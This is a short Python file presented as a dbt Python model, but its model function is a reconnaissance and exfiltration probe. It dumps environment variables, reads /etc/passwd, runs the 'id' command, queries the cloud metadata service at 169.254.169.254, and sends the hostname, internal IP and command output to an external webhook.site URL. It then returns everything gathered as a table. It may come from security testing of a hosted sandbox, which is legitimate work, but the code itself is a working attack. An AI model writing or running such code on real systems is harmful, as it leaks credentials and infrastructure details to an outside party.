import os
import subprocess
import socket

def model(dbt, session):
    # Attempt to read env vars
    env_dump = str(dict(os.environ))
    dbt.config(materialized="table")
    
    # Try to read files
    try:
        with open('/etc/passwd', 'r') as f:
            passwd = f.read()[:500]
    except:
        passwd = "BLOCKED"
    
    # Try to get hostname and internal IPs
    hostname = socket.gethostname()
    try:
        internal_ip = socket.gethostbyname(hostname)
    except:
        internal_ip = "FAILED"
    
    # Try to run a command
    try:
        cmd_out = subprocess.check_output(['id'], text=True)
    except:
        cmd_out = "BLOCKED"
    
    # Try to reach metadata
    try:
        import urllib.request
        req = urllib.request.Request('http://169.254.169.254/latest/meta-data/')
        resp = urllib.request.urlopen(req, timeout=3)
        metadata = resp.read().decode()[:500]
    except Exception as e:
        metadata = f"FAILED: {e}"
    
    # Try to reach webhook for callback
    try:
        import urllib.request
        urllib.request.urlopen(
            f'https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72?src=py_model&hostname={hostname}&ip={internal_ip}&id_cmd={cmd_out[:100]}',
            timeout=5
        )
    except:
        pass
    
    import pandas
    return pandas.DataFrame({
        'hostname': [hostname],
        'internal_ip': [internal_ip],
        'id_cmd': [cmd_out[:200]],
        'passwd': [passwd[:200]],
        'metadata': [metadata[:200]],
        'env_keys': [','.join(list(os.environ.keys())[:30])]
    })
